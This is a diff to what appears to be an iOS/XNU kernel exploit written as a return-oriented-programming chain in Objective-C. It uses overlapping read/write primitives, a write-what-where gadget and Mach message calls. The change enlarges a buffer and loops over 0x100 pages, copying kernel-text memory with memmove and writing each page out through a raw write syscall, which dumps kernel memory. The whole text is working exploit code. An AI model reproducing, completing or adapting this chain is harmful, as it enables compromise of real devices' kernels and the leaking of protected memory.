@@ -1006,6 +1006,7 @@ StoreR0(push, where)
         char mscratch[8192];
         char scratch[8192];
         mach_timespec_t waitTime;
+        char kern_pages[0x100 * 0x1000];
     } args_t;
     
     args_t args_s;
@@ -1559,7 +1560,7 @@ step(i);\
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     
-    for (int i = 0; i < 0x70; i++) {
+    for (int i = 0; i < 0x100; i++) {
         ReadWriteOverlap();
         tmptoscratch();
         LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
@@ -1571,7 +1572,10 @@ step(i);\
         ReadWriteScratchOverlap();
         
         ReadWriteOverlapped512();
-        RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
+        [dy setSlide:dy.slide+1]; // enter thumb
+        RopCallFunction9Deref1(PUSH, @"__platform_memmove", 1, SEG_VAR(tmp_msg.desc.address), SEG_VAR(kern_pages[(i * 0x1000)]), 0, 4096, 0, 0, 0, 0, 0, 0);
+        [dy setSlide:dy.slide-1]; // enter thumb
+        RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_write, 0, SEG_VAR(kern_pages[(i * 0x1000)]), 4096, 0, 0, 0, 0, 0);
     }
     
     
@@ -1583,11 +1587,6 @@ step(i);\
     WriteWhatWhere(PUSH, 0xFFFFFFFF, SEG_VAR(scratch[1024 - 0x58 + 0x20])); // make sure this does not get free'd
     ReadWriteScratchOverlap();
     
-    
-    
-    
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
